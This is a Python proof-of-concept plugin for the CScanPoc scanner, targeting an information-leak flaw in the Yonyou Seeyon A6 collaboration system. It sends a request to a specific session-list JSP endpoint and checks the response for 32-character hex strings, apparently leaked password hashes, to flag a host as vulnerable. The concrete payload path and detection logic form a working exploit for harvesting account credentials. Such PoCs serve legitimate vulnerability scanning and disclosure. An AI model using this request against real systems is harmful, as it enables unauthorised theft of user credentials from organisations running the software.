# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'yonyou_0044' # 平台漏洞编号，留空
    name = '用友致远A6协同系统 账号密码泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        用友致远A6协同系统 /yyoa/ext/https/getSessionList.jsp?cmd=getAll 导致账号密码泄露。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '用友'  # 漏洞应用名称
    product_version = '用友致远A6协同系统'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '0b94c089-881a-411e-b27a-844192d72efe'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            arg = self.target
            reg = re.compile(r'[a-fA-F0-9]{32,32}')
            payload = "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
            code, _, res, _, _ = hh.http(arg + payload)
            m = reg.findall(res)
            if m and code == 200:
                #security_warning(arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                           
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()

